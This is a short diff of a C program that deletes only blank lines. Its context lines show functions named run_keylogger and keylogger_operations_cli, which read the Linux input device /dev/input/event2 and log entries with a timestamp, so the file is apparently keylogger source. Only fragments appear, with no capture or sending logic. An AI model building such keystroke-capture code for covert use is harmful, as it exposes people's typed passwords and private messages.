@@ -223,7 +223,6 @@ void keylogger_operations_cli(int argc, char *argv[]) {
 }
 
 
-
 void run_keylogger() {
 
     const char *device = "/dev/input/event2"; 
@@ -253,7 +252,6 @@ void run_keylogger() {
         exit(1);
 
     }
-
 
 
     // Add a timestamp to the log
